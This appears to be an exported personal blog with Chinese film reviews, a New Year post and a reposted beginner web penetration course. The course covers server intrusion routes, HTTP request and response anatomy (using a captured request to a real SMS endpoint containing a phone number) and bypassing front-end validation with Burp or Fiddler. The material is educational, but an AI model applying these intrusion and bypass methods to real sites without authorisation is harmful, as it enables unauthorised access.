<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fncppolug7j31kw0zk1dp.jpg" width="80%"></p>
<p>这句出自Mark Twain的名言，也让我印象深刻。</p>
<p>有的人会说，这部电影结局很完美，但正因完美却显得不真实。</p>
<p>于我而言：真不真实，结局如何，只是一时刻的感受而已。</p>
<p>而最重要的应是思考导演通过电影，想表达什么思想，能引发我们什么思考吧？</p>
<p>在这部片里，印证了：</p>
<ol>
<li>灵魂相通的男女不一定要肉体交换才能升华感情，互相懂得可以高山流水知音难求。这才是绅士和女性在这世界上创造的美好，他们不需要睡觉，他们是最相爱的朋友，这份爱里有无限尊重和心疼，超越任何感情。（Adult Conversation）</li>
<li>男人应让自己 sensitive 和 gentlemanly，而不是只会打游戏，形象邋遢，连劈腿道歉都企图用网络语言和邮件短信。</li>
<li>Say the right thing. Do the right thing . Be the right thing.</li>
</ol>
<p><br></p>
<p>看完，感触很深，但当真正想写些什么的时候，却又不知道说什么。</p>
<p>愿消化完这份感触之后，</p>
<p>我能发现自己的不足，聆听自己内心的声音，做正确的事，遇见更好的自己，然后有一日能成为像Ben一样拥有独特的人格魅力，sensitive ，gentlemanly，又有新时代的气息的人。</p>
<p><br></p>
<p><strong>这部片，值得多刷</strong></p>
<p>更多细致影评：<a href="https://www.zhihu.com/question/35875851" target="_blank" rel="noopener">如何评价《实习生》（The Intern）这部电影？</a></p>
<h3 id="前任3-再见前任"><a href="#前任3-再见前任" class="headerlink" title="前任3-再见前任"></a>前任3-再见前任</h3><p>​    我好像1-2-3，都看了～感觉除了虐还是虐～催泪部分都给我免疫了～～emm～～</p>
<h3 id="Paterson-帕特森"><a href="#Paterson-帕特森" class="headerlink" title="Paterson 帕特森"></a>Paterson 帕特森</h3><p>一部平淡的文艺片～</p>
<h3 id="Arrival-降临"><a href="#Arrival-降临" class="headerlink" title="Arrival 降临"></a>Arrival 降临</h3><p>​    Wow，这部片开头我其实没看懂～～～但是。看到后面我着实是看上瘾了。特别是结局～～这个脑洞。。。I like it！！Fantastic！！！！</p>
<h3 id="Yougth-芳华"><a href="#Yougth-芳华" class="headerlink" title="Yougth 芳华"></a>Yougth 芳华</h3><p>​    善良的人～</p>
</the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Film </tag>
            
            <tag> Perception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[See you 2017 , Hello 2018]]></title>
      <url>/2018/01/01/bye2017/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br><em>What we have once enjoyed we can never lose . All that we love becomes part of us .</em>  ——Helen Keller<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p>To 2017：You let me cry,smile and laugh,but you let me be ambitious for my future at last.</p>
<p>To 2018：Be down-to-earth -&gt; Fulfill my flags step by step  <strong>:)</strong></p>
<p>Only for encountering a better-me～<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmz7ypepakj309q01ywem.jpg" width="20%"></p>
<hr>

<center><strong><em>《TIME ZONE》</em></strong></center>

<p><br></p>
<center><em>New York is 3 hours ahead of California,</em></center>

<center><em>but it does not make California slow.</em></center>

<center><em>Someone graduated at the age of 22,</em></center>

<center><em>but waited 5 years before securing a good job！</em></center><br><br><center><em>Someone became a CEO at 25,</em></center>

<center><em>and died at 50.</em></center>

<center><em>While another became a CEO at 50,</em></center>

<center><em>and lived to 90 years.</em></center>

<center><br><center><em>Someone is still single,</em></center>

<center><em>while someone else got married.</em></center>

<center><em>Obama retires at 55,</em></center>

<center><em>but Trump starts at 70.</em></center>

<center><br><center><em>Absolutely everyone in this world works based on their Time Zone.</em></center>

<center><em>People around you might seem to go ahead of you,</em></center>

<center><em>some might seem to be behind you.</em></center>

<center><em>But everyone is running their own RACE, in their own TIME</em></center>.<br><br><center><em>Don’t envy them or mock them.</em></center>

<center><em>They are in their TIME ZONE,and you are in yours！</em></center>

<center><br><center><em>Life is about waiting for the right moment to act.</em></center>

<center><em>So, RELAX.</em></center>

<center><em>You’re not LATE.</em></center>

<center><em>You’re not EARLY.</em></center>

<center><em>You are very much ON TIME,and in your TIME ZONE Destiny set up for you.</em></center>

<p> <br></p>
<p>  <br></p>
<center><strong>·End ·</strong></center></center></center></center></the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 心路历程 </tag>
            
            <tag> Expectation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017-films]]></title>
      <url>/2017/12/30/2017films/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>之前有些看的都已经忘记了～趁元旦有些许空档，就补了几部电影～<a id="more"></a></excerpt></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<h2 id="《-A-Ghost-Story》（《鬼魅浮生》）"><a href="#《-A-Ghost-Story》（《鬼魅浮生》）" class="headerlink" title="《 A Ghost Story》（《鬼魅浮生》）"></a>《 A Ghost Story》（《鬼魅浮生》）</h2><p>原本以为是一部鬼片～结果看完之后，发现是一部文艺意识流的“鬼片”</p>
<p>最印象深刻的就是女主，吃派吃到吐的画面～</p>
<p>看完第一遍，的确是一脸茫然，但是细思过后，仿佛又好像明白了些什么：</p>
<p>整部片子，基调有点悲观，以床单鬼为线索，镜头很长，但过渡很自然。亮点就是能用肢体语言表达的都不会用台词，能用镜头表达的也不用台词，全是用镜头语言～～所以才会“细思极恐”</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmyp5bfnt2j30fe0bkgmb.jpg" alt=""></p>
</the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Film </tag>
            
            <tag> Perception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透课程]]></title>
      <url>/2017/12/26/%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>无意中发现的 treasure <strong>:) </strong>，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p><strong>本文所有文章均转载自：<a href="http://www.yuntest.org/" target="_blank" rel="noopener">http://www.yuntest.org/</a> 如有侵权，请联系。</strong></p>
<hr>
<p><br></p>
<h1 id="前言-揭开Web渗透与安全的面纱（必看）"><a href="#前言-揭开Web渗透与安全的面纱（必看）" class="headerlink" title="前言-揭开Web渗透与安全的面纱（必看）"></a>前言-揭开Web渗透与安全的面纱（必看）</h1><h2 id="服务器是怎么被入侵的"><a href="#服务器是怎么被入侵的" class="headerlink" title="服务器是怎么被入侵的"></a>服务器是怎么被入侵的</h2><p>攻击者想要对一台计算机<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>必须具备以下条件：</p>
<p>1、服务器与客户端能够正常通讯</p>
<p>（服务器是为客户端提供服务的）</p>
<p>2、服务器向客户端提供的权限（服务）或者说是端口。</p>
<h2 id="服务端所提供的服务"><a href="#服务端所提供的服务" class="headerlink" title="服务端所提供的服务"></a>服务端所提供的服务</h2><p>早期的黑客入侵的方法大部分都是对服务器进行端口扫描，对数据库的爆破，以及对FTP的爆破（穷举）缓冲区溢出攻击的方式。尽管如此没有含量的<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>，在当时的100台计算机中，大约有20台计算机能中招。可见当初的web服务器很脆弱。</p>
<p>我为什么说这些呢，好，接着看。如今的web不仅仅是web，它还有个名字叫做 web应用程序 。为什么叫做web应用程序，因为web已经不是以前的web，它可以社交、购物、办公、游戏、公司管理、学校管理等等等等！从某种方面上来讲，它比客户端程序更方便，更出色，更完善。</p>
<hr>
<h2 id="了解web的基础知识"><a href="#了解web的基础知识" class="headerlink" title="了解web的基础知识"></a>了解web的基础知识</h2><p>我们可以把html,asp,php等网页看做是一种程序（脚本语言），而他需要放在服务器的web容器（比如iis,Apache等）里才能编译成可视化内容。所以我们用户访问的网站都是经过容器编译过的。Web容器是基于系统的，它可以对计算机系统发出命令。Web容器又是处理网站脚本文件的，也就是说：我们是通过对脚本程序发出命令，再由Web容器处理，间接操纵服务器</p>
<h2 id="怎么攻陷服务器"><a href="#怎么攻陷服务器" class="headerlink" title="怎么攻陷服务器"></a>怎么攻陷服务器</h2><p>这张图是我在某群里下载的，个人感觉概括性很强，就用到这里来了。大家看的懂得就看得懂，看不懂的也没关系。但是以下内容必须看得懂：</p>
<p>想入侵一台服务器，大致分为3个入口：</p>
<p>1,C段攻击</p>
<p>2,services</p>
<p>3,社会工程学</p>
<p>C段攻击指的是攻击者通过渗透同一个网段内的一台主机对目标主机进行ARP等手段渗透</p>
<p>社会工程学：高端攻击必须掌握的一个技能,是属于脚本以外的社交欺骗技术,涉及到物理渗透, 总之就是—骗 。（后面详说）</p>
<p>至于services：又有很多入口（溢出、MySQL、FTP、mssql、rdp、web等等）,这里的Web指的是网站脚本程序,也存在入口（注入,上传漏洞,xss,包含漏洞,代码执行,逻辑漏洞等等等等）</p>
<p>差不多我要讲课的大半部分内容都围绕着以上的知识点。特别是services</p>
<h1 id="第一篇-Web渗透需要接触的语言"><a href="#第一篇-Web渗透需要接触的语言" class="headerlink" title="第一篇-Web渗透需要接触的语言"></a>第一篇-Web渗透需要接触的语言</h1><p>—恢复内容开始—</p>
<p>上一篇我们讲过了,Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>的基本原理,在原理中我们也提到了Web应用程序（脚本语言）,本章就谈到了Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>要涉及的语言。</p>
<h2 id="涉及语言："><a href="#涉及语言：" class="headerlink" title="涉及语言："></a>涉及语言：</h2><p>1、html:是前段语言的其中一个,也是最常见的,涉及审查元素的修改以及自行构造界面（如构造上传点）</p>
<p>2、JavaScript:也是属于前段语言之一（掌握这个语言可以更了解<a href="http://www.yuntest.org/archives/tag/xss/" target="_blank" rel="noopener">xss</a>跨站脚本攻击）</p>
<p>3、数据库:这里的数据库不止是一种语言,而是包含了多种数据库（如我们常见MySQL,ms<a href="http://www.yuntest.org/archives/tag/sql/" target="_blank" rel="noopener">sql</a>,db2）,而我们要掌握的就是操控数据库的SQL语句,在<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>的时候多用到。</p>
<p>4、JAVA:跨平台语言,无论在哪个系统,只需要一个环境,web领域中有很多涉及。有很多大型企业都是用JAVA开发Web。还有我们的渗透神器burp 等等都是由JAVA开发。</p>
<p>5、PHP,跨平台语言,即写即用,无需编译。当代主流Web程序。</p>
<p>6、C/C++:公认的永远不会衰败的语言,怎么说呢,这个必须学,学了只有好处没有坏处。Windows操作系统一大部分都是由C完成的。</p>
<h2 id="小编说"><a href="#小编说" class="headerlink" title="小编说"></a>小编说</h2><p>看到这里许多朋友可能会问,学个渗透还得需要学那么多基础。肯定有一些人要放弃了。其实小编也是九牛一毛,就学了一些平常会用到的,很多时候还得看前辈的文章。不过多多少少还是有点经验的,下面就分享小编偷工减料的技巧,其实我们可以学三个最经常用到的,也是最简单的（html,JavaScript,SQL）还有就是抽空出来学习c语言</p>
<h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><p>1、html:html的语法实在是很简单,只需要学清楚头标记、尾标记（闭合）,空标记。以及一些调用,参数设置,简单标签。百度搜索html教程就有一大堆免费教程</p>
<p>2、js可以从这里学<a href="http://www.w3school.com.cn/js/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/js/index.asp</a>   w3school系列的挺不错</p>
<p>3、SQL:其实小编认为这个稍微了解一下就好了,毕竟现在的工具越来越成熟,在<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>方面都是以工具为主</p>
<p>4、C语言：如果你看过了html,那你学这个会有一定的思路引导。小编之前是在:慕课网学的(百度搜索）,简单通俗易懂。</p>
<p>5、还有一些常用的DOS命令也是必须要学的,例如net user啊什么的</p>
<p>6、JAVA可以不用太深入学习,但是！必须了解它的框架构造以及环境的搭建（后面用的地方多着呢）</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果不是学代码审计工作,而是本着Web的目标去学习,那么用小编所说的偷懒学习法去学习还是挺合适的。但是能学还是要尽量学的,一个百度就解决了。许多小白和大神的差距就在代码上。可能会有人说：我不会英语该怎么学。</p>
<p>其实这东西跟英语关系不是很大,只要你用心一个一个学,一门通门门通。只要认真和耐心。</p>
<p>如果朋友你对脚本语言之前不是很了解,那么也没关系,接着往下看,只是要多做笔记,看一篇就如百度了解一篇涉及的内容。如果看到一半卡住了,可以随时回来学脚本。</p>
<p>—恢复内容结束—</p>
<h1 id="第二篇上-http请求协议的简单描述"><a href="#第二篇上-http请求协议的简单描述" class="headerlink" title="第二篇上-http请求协议的简单描述"></a>第二篇上-http请求协议的简单描述</h1><h2 id="HTTP协议剖析"><a href="#HTTP协议剖析" class="headerlink" title="HTTP协议剖析"></a>HTTP协议剖析</h2><p>什么是HTTP协议？如何发起请求？我认为这样讲大家能够理解：</p>
<p>浏览器访问网站也是http请求的一个过程。当你打开浏览器,访问一个URL</p>
<p>（协议://服务器IP:端口/路径/文件）的时候,相当于向服务器发送了一个http请求,然后服务器会根据你的请求,向你响应一个HTML数据。这个客户端与服务端交互的过程叫做http协议。那么这个协议的过程是什么样子的呢？（简版）</p>
<p>1：客户端向服务端发送请求</p>
<p>2：服务端向客户端响应html数据</p>
<p>3：连接自动切断</p>
<p>PS:这个请求只能由客户端发起,而服务端不能主动向客户端发起！</p>
<p>然而我们通过浏览器发送的http请求,在服务器响应后,客户端接受到的数据都是被浏览器渲染过而显示的画面。为了能更清晰的剖析客户端与服务端之间的协议交互,我们来一次脱离浏览器的http请求。这就要借用到我们的工具:</p>
<p>curl.exe</p>
<p>一般来说Linux自带curl.exe 似乎Windows没有自带curl.exe 没关系,Windows的用户也可以通过下载使用。</p>
<h2 id="脱离浏览器发起http请求"><a href="#脱离浏览器发起http请求" class="headerlink" title="脱离浏览器发起http请求"></a>脱离浏览器发起http请求</h2><p>我们可以通过输入命令:</p>
<p>cURL <a href="http://www.baidu.com/" target="_blank" rel="noopener">http://www.baidu.com/</a></p>
<p>来向百度发起http请求,看看返回的响应结果吧！</p>
<p>看,返回的是一个html文件数据！我们还可以在原命令的基础上后面加个参数 -I 来查看http服务器返回的响应头。</p>
<p>好了我们基本了解了http请求的基本逻辑,就通过下面这篇文章来对http进行深度剖析吧！</p>
<h1 id="第二篇下-HTTP协议的请求与响应深度剖析"><a href="#第二篇下-HTTP协议的请求与响应深度剖析" class="headerlink" title="第二篇下-HTTP协议的请求与响应深度剖析"></a>第二篇下-HTTP协议的请求与响应深度剖析</h1><h2 id="什么是请求方法？什么是请求头？"><a href="#什么是请求方法？什么是请求头？" class="headerlink" title="什么是请求方法？什么是请求头？"></a>什么是请求方法？什么是请求头？</h2><h3 id="HTTP请求信息由3部分组成："><a href="#HTTP请求信息由3部分组成：" class="headerlink" title="HTTP请求信息由3部分组成："></a>HTTP请求信息由3部分组成：</h3><p>1、请求方法（GET/POST） URI 协议/版本</p>
<p>2、请求头(Request Header)</p>
<p>3、请求正文</p>
<h3 id="下面我们来分析一个http请求："><a href="#下面我们来分析一个http请求：" class="headerlink" title="下面我们来分析一个http请求："></a>下面我们来分析一个http请求：</h3><p>POST <a href="http://xg.mediportal.com.cn/health/sms/verify/telephone" target="_blank" rel="noopener">http://xg.mediportal.com.cn/health/sms/verify/telephone</a> HTTP/1.1</p>
<p>User-Agent: DGroupPatient/1.052701.230/Dalvik/2.1.0 (Linux; U; Android 5.1.1; KIW-AL10 Build/HONORKIW-AL10)</p>
<p>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</p>
<p>Host: xg.mediportal.com.cn</p>
<p>Connection: Keep-Alive</p>
<p>Accept-Encoding: gzip</p>
<p>Content-Length: 33</p>
<p>telephone=15527177736&amp;userType=1&amp;</p>
<h4 id="我们来对这段请求进行分析："><a href="#我们来对这段请求进行分析：" class="headerlink" title="我们来对这段请求进行分析："></a>我们来对这段请求进行分析：</h4><p>请求的第一行是—-方法（POST） URL 协议（HTTP）/版本（1.1）</p>
<p>这里的POST就是方法 HTTP请求可以使用多种请求方法。</p>
<h3 id="（1）HTTP1-1目前支持以下7种请求方法："><a href="#（1）HTTP1-1目前支持以下7种请求方法：" class="headerlink" title="（1）HTTP1.1目前支持以下7种请求方法："></a>（1）HTTP1.1目前支持以下7种请求方法：</h3><ul>
<li>GET ：请求获取由Request-URI所标识的资源</li>
<li>POST：在Request-URI所标识的资源后附加新的数据</li>
<li>HEAD：请求获取由Request-URI所标识的资源的响应消息报头</li>
<li>OPTIONS：请求查询服务器的性能，或查询与资源相关的选项和需求</li>
<li>PUT：请求服务器存储一个资源，并用Request-URI作为其标识</li>
<li>DELETE：请求服务器删除由Request-URI所标识的资源</li>
<li>TRACE：请求服务器回送收到的请求信息，主要用语测试或诊断，在Internet应用中，最常用的方法是GET和POST。最后，协议版本声明了通信过程中使用HTTP的版本。</li>
</ul>
<h3 id="（2）请求头-Request-Header"><a href="#（2）请求头-Request-Header" class="headerlink" title="（2）请求头(Request Header)"></a>（2）请求头(Request Header)</h3><p>请求头包含许多有关的客户端环境和请求正文的有用信息。例如：请求头可以声明浏览器所用的语言，请求正文的长度等。</p>
<ul>
<li>User-Agent: DGroupPatient/1.052701.230/Dalvik/2.1.0 (Linux; U; Android 5.1.1; KIW-AL10 Build/HONORKIW-AL10) //用户发送请求的客户端环境</li>
<li>Content-Type: application/x-www-form-urlencoded; charset=UTF-8 //表单默认的提交数据的格式</li>
<li>Host: xg.mediportal.com.cn //请求资源的Intenet主机和端口号</li>
<li>Connection: Keep-Alive //持久连接</li>
<li>Accept-Encoding: gzip //浏览器能够进行解码的数据编码方式</li>
<li>Content-Length: 33 //请求正文的长度</li>
<li>Content-Type</li>
</ul>
<p><strong>是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。</strong></p>
<p>Content-Type: [type]/[subtype]; parameter。例如最常见的就是text/html，它的意思是说返回的内容是文本类型，这个文本又是HTML格式的。原则上浏览器会根据Content-Type来决定如何显示返回的消息体内容：</p>
<ul>
<li>Host指定请求资源的Intenet主机和端口号，必须表示请求url的原始服务器或网关的位置。HTTP/1.1请求必须包含主机头域，否则系统会以400状态码返回</li>
<li>Accept：浏览器可接受的MIME类型</li>
<li>Accept-Charset：浏览器可接受的字符集</li>
<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间</li>
<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到</li>
<li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中</li>
<li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep- Alive”，或者看到请求使用的是HTTP1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入 ByteArrayOutputStream，然后在正式写出内容之前计算它的大小</li>
<li>Content-Length：表示请求消息正文的长度</li>
<li>Cookie：这是最重要的请求头信息之一</li>
<li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它</li>
<li>Host：初始URL中的主机和端口</li>
<li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答</li>
<li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝</li>
<li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
<li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用</li>
<li>UA-Pixels，UA-Color，UA-OS，UA-CPU ： 由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型</li>
</ul>
<h4 id="常见的MIME类型如下："><a href="#常见的MIME类型如下：" class="headerlink" title="常见的MIME类型如下："></a>常见的MIME类型如下：</h4><p>text/html ： HTML格式</p>
<p>text/plain ：纯文本格式</p>
<p>text/xml ： XML格式</p>
<p>image/gif ：gif图片格式</p>
<p>image/jpeg ：jpg图片格式</p>
<p>image/png：png图片格式</p>
<p>以application开头的媒体格式类型：</p>
<p>application/xhtml+xml ：XHTML格式</p>
<p>application/xml ： XML数据格式</p>
<p>application/atom+xml ：Atom XML聚合格式</p>
<p>application/json ： JSON数据格式</p>
<p>application/pdf ：pdf格式</p>
<p>application/msword ： Word文档格式</p>
<p>application/octet-stream ： 二进制流数据（如常见的文件下载）</p>
<p>application/x-www-form-urlencoded ： <form enctype="””">中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</form></p>
<p>另外一种常见的媒体格式是上传文件之时使用的：</p>
<p>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</p>
<h3 id="（3）请求正文"><a href="#（3）请求正文" class="headerlink" title="（3）请求正文"></a>（3）请求正文</h3><p>请求头和请求正文之间是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。请求正文中可以包含客户提交的查询字符串信息：</p>
<p>telephone=15527177736&amp;userType=1&amp;</p>
<h3 id="HTTP响应格式"><a href="#HTTP响应格式" class="headerlink" title="HTTP响应格式"></a>HTTP响应格式</h3><p><strong>HTTP应答与HTTP请求相似，HTTP响应也由3个部分构成，分别是：</strong></p>
<p>1、状态行</p>
<p>2、响应头(Response Header)</p>
<p>3、响应正文</p>
<p><strong>以下就是一个响应格式，我们来分析：</strong></p>
<p>HTTP/1.1 200 OK //状态行</p>
<p>Server: nginx</p>
<p>Date: Tue, 31 May 2016 02:09:24 GMT</p>
<p>Content-Type: application/json;charset=UTF-8</p>
<p>Connection: keep-alive</p>
<p>Vary: Accept-Encoding</p>
<p>Access-Control-Allow-Origin: *</p>
<p>Access-Control-Allow-Headers: X-Requested-With,access_token,access-token,content-type,multipart/form-data,application/x-www-form-urlencoded</p>
<p>Access-Control-Allow-Methods: GET,POST,OPTIONS</p>
<p>Content-Length: 49</p>
<p>{“resultCode”:1,”resultMsg”:”手机号未注册”} //正文</p>
<h4 id="（1）状态行"><a href="#（1）状态行" class="headerlink" title="（1）状态行"></a>（1）状态行</h4><p>由协议版本、数字形式的状态代码、及相应的状态描述，各元素之间以空格分隔。</p>
<p>状态代码：状态代码由3位数字组成，表示请求是否被理解或被满足。</p>
<p>状态描述：状态描述给出了关于状态代码的简短的文字描述。</p>
<p>状态代码的第一个数字定义了响应的类别，后面两位没有具体的分类。</p>
<p><strong>第一个数字有五种可能的取值：</strong></p>
<p>- 1xx: 指示信息—表示请求已接收，继续处理。</p>
<p>- 2xx: 成功—表示请求已经被成功接收、理解、接受。</p>
<p>- 3xx: 重定向—要完成请求必须进行更进一步的操作。</p>
<p>- 4xx: 客户端错误—请求有语法错误或请求无法实现。</p>
<p>- 5xx: 服务器端错误—服务器未能实现合法的请求。</p>
<p>常见的状态码：</p>
<ul>
<li>200 OK 客户端请求成功</li>
<li>400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。</li>
<li>401 Unauthonzed 请求未经授权。这个状态代码必须和WWW-Authenticate报头域一起使用</li>
<li>403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因</li>
<li>404 Not Found 请求的资源不存在，例如，输入了错误的URL。</li>
<li>500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。</li>
<li>503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常</li>
</ul>
<h4 id="（2）响应头"><a href="#（2）响应头" class="headerlink" title="（2）响应头"></a>（2）响应头</h4><p>响应头可能包括：</p>
<ul>
<li>Location：Location响应报头域用于重定向接受者到一个新的位置。例如：客户端所请求的页面已不存在原先的位置，为了让客户端重定向到这个页面新的位置，服务 器端可以发回Location响应报头后使用重定向语句，让客户端去访问新的域名所对应的服务器上的资源。当我们在JSP中使用重定向语句的时候，服务器 端向客户端发回的响应报头中，就会有Location响应报头域。</li>
<li>Server：Server响应报头域包含了服务器用来处理请求的软件信息。它和User-Agent请求报头域是相对应的，前者发送服务器端软件的信息，后者发送客户 端软件(浏览器)和操作系统的信息。下面是Server响应报头域的一个例子：Server: Apache-Coyote/1.1</li>
<li>WWW-Authenticate：WWW-Authenticate响应报头域必须被包含在401(未授权的)响应消息中，这个报头域和前面讲到的Authorization请求报头域是 相关的，当客户端收到401响应消息，就要决定是否请求服务器对其进行验证。如果要求服务器对其进行验证，就可以发送一个包含了 Authorization报头域的请求，下面是WWW-Authenticate响应报头域的一个例子：WWW-Authenticate: Basic realm=”Basic Auth Test!”</li>
<li>从这个响应报头域，可以知道服务器端对我们所请求的资源采用的是基本验证机制。</li>
<li>Content-Encoding：Content-Encoding实体报头域被使用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容编码，因而要获得Content- Type报头域中所引用的媒体类型，必须采用相应的解码机制。Content-Encoding主要用语记录文档的压缩方法，下面是它的一个例子： Content-Encoding: gzip。如果一个实体正文采用了编码方式存储，在使用之前就必须进行解码。</li>
<li>Content-Language：Content-Language实体报头域描述了资源所用的自然语言。Content-Language允许用户遵照自身的首选语言来识别和区分实体。 如果这个实体内容仅仅打算提供给丹麦的阅读者，那么可以按照如下的方式设置这个实体报头域：Content-Language: da。</li>
<li>如果没有指定Content-Language报头域，那么实体内容将提供给所以语言的阅读者。</li>
<li>Content-Length：Content-Length实体报头域用于指明正文的长度，以字节方式存储的十进制数字来表示，也就是一个数字字符占一个字节，用其对应的ASCII码存储传输。</li>
<li>要注意的是：这个长度仅仅是表示实体正文的长度，没有包括实体报头的长度。</li>
<li>Content-Type :Content-Type实体报头域用语指明发送给接收者的实体正文的媒体类型。例如：</li>
<li>Content-Type: text/html;charset=ISO-8859-1</li>
<li>Content-Type: text/html;charset=GB2312</li>
<li>Last-Modified :Last-Modified实体报头域用于指示资源最后的修改日期及时间。</li>
<li>Expires :Expires实体报头域给出响应过期的日期和时间。通常，代理服务器或浏览器会缓存一些页面。当用户再次访问这些页面时，直接从缓存中加载并显示给用 户，这样缩短了响应的时间，减少服务器的负载。为了让代理服务器或浏览器在一段时间后更新页面，我们可以使用Expires实体报头域指定页面过期的时 间。当用户又一次访问页面时，如果Expires报头域给出的日期和时间比Date普通报头域给出的日期和时间要早(或相同)，那么代理服务器或浏览器就 不会再使用缓存的页面而是从服务器上请求更新的页面。不过要注意，即使页面过期了，也并不意味着服务器上的原始资源在此时间之前或之后发生了改变。</li>
<li>Expires实体报头域使用的日期和时间必须是RFC 1123中的日期格式，例如：</li>
<li>Expires: Thu, 15 Sep 2005 16:00:00 GMTHTTP1.1的客户端和缓存必须将其他非法的日期格式(也包括0)看作已过期。例如，为了让浏览器不要缓存页面，我们也可以利用Expires实体报头 域，设置它的值为0，如下(JSP)：response.setDateHeader(“Expires”,0);</li>
</ul>
<h1 id="第三篇-体验http协议的应用"><a href="#第三篇-体验http协议的应用" class="headerlink" title="第三篇-体验http协议的应用"></a>第三篇-体验http协议的应用</h1><p>之前我们都了解了,访问网页时,客户端与服务端之间的请求与响应数据交互。本篇就浅谈它的应用。</p>
<h2 id="利用HTTP拦截突破前段验证"><a href="#利用HTTP拦截突破前段验证" class="headerlink" title="利用HTTP拦截突破前段验证"></a>利用HTTP拦截突破前段验证</h2><p>比方说,我们在某个网页提交某些数据（例如留言、<a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>、插入xss等）,发生错误（例如提示不支持该文件、您提交的内容非法）</p>
<p>如果提交之后,在原网页发生以上错误,而不是网页跳转之后发出提示。那么很可能网站验证方式是前端验证。</p>
<h3 id="什么是前端验证？"><a href="#什么是前端验证？" class="headerlink" title="什么是前端验证？"></a>什么是前端验证？</h3><p>就是在客户端发送请求,服务器响应后向客户端传输网页（html）和验证脚本（JavaScript）,我们提交内容时候都要经过网站js的验证。</p>
<p>（简单介绍）</p>
<p>而这里的这个js验证就是属于前端验证,也就是客户端验证,它只在客户端作用。</p>
<h3 id="如何突破验证"><a href="#如何突破验证" class="headerlink" title="如何突破验证"></a>如何突破验证</h3><p>这里就要用到工具了</p>
<p>推荐工具:burp、fiddler</p>
<p>这些工具有什么用呢,在这里他们的作用就是能拦截和修改http请求,也就是所谓的<a href="http://www.yuntest.org/archives/tag/zhua-bao/" target="_blank" rel="noopener">抓包</a>。</p>
<p>工具拦截突破过程原理：</p>
<p>1,开启http拦截</p>
<p>2,在网页内提交js判断规则内允许提交的内容</p>
<p>3,此时提交的请求已经被工具拦截了,网页属于堵塞状态,而且我们提交的内容已经被js判断为允许了。</p>
<p>4,在工具内修改拦截的内容（请求内容）</p>
<p>5,发送数据包（接触拦截.正常流通）</p>
<h3 id="如何绕过验证"><a href="#如何绕过验证" class="headerlink" title="如何绕过验证"></a>如何绕过验证</h3><p>同理,在接受响应时拦截包。并删除js验证用的代码</p>
